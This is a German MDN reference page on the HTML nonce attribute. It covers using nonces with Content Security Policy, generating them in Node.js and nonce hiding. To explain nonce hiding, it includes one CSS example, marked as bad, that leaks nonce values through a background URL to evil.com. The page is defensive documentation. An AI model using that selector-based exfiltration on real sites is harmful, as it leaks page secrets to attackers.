---
title: HTML nonce globales Attribut
short-title: nonce
slug: Web/HTML/Reference/Global_attributes/nonce
l10n:
  sourceCommit: 0754cd805a8e010d2e3a2a065f634a3bcf358252
---

Das **`nonce`** [globale Attribut](/de/docs/Web/HTML/Reference/Global_attributes)
ist ein Inhaltsattribut, das ein kryptografisches Nonce ("Zahl nur einmal verwendet") definiert. Es kann von
[Content Security Policy (CSP)](/de/docs/Web/HTTP/Guides/CSP) verwendet werden, um zu bestimmen, ob ein bestimmter Abruf
für ein gegebenes Element fortgesetzt werden darf.

## Beschreibung

Das `nonce`-Attribut ist nützlich, um spezifische Elemente, wie ein bestimmtes eingebettetes Script oder Stilelemente, auf eine Positivliste zu setzen.
Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/Guides/CSP) `unsafe-inline` Direktive zu vermeiden, die _alle_ eingebetteten Scripts oder Stile auf eine Positivliste setzen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen Sie keine andere Möglichkeit haben, unsichere eingebettete Script-
> oder Stil-Inhalte zu vermeiden. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Script statisch ist, können Sie stattdessen auch einen CSP-Hash verwenden.
> (Siehe Nutzungshinweise zu [unsicheren eingebetteten Scripts](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Versuchen Sie immer, den vollen Vorteil der [CSP](/de/docs/Web/HTTP/Guides/CSP) Schutzmechanismen zu nutzen und vermeiden Sie Nonces oder unsichere eingebettete Scripts wann immer möglich.

### Verwenden von nonce, um ein `<script>` Element auf eine Positivliste zu setzen

Es gibt einige Schritte, um ein eingebettetes Script mithilfe des Nonce-Mechanismus auf eine Positivliste zu setzen:

#### Werte generieren

Generieren Sie von Ihrem Webserver aus einen zufälligen Base64-codierten String mit mindestens 128 Bit Daten aus einem kryptografisch sicheren
Zufallszahlengenerator. Nonces sollten jedes Mal unterschiedlich generiert werden, wenn die Seite geladen wird (Nonce nur einmal verwenden!). Zum Beispiel in nodejs:

```js
import crypto from "node:crypto";

crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Inline-Script auf die Positivliste setzen

Das im Backend-Code generierte Nonce sollte nun für das eingebettete Script, das Sie auf die Positivliste setzen möchten, verwendet werden:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Senden eines Nonce mit einem CSP-Header

Schließlich müssen Sie den Nonce-Wert in einem
[`Content-Security-Policy`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy) Header
senden (fügen Sie `nonce-` voran):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Nonce-Verbergung

Aus Sicherheitsgründen wird das `nonce` Inhaltsattribut verborgen (ein leerer String wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce) Eigenschaft ist der einzige Weg, um auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Die Nonce-Verbergung hilft, Angreifer daran zu hindern, Nonce-Daten über Mechanismen zu exfiltrieren, die Daten
aus Inhaltsattributen wie diesem erfassen können:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/Guides/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/script-src)
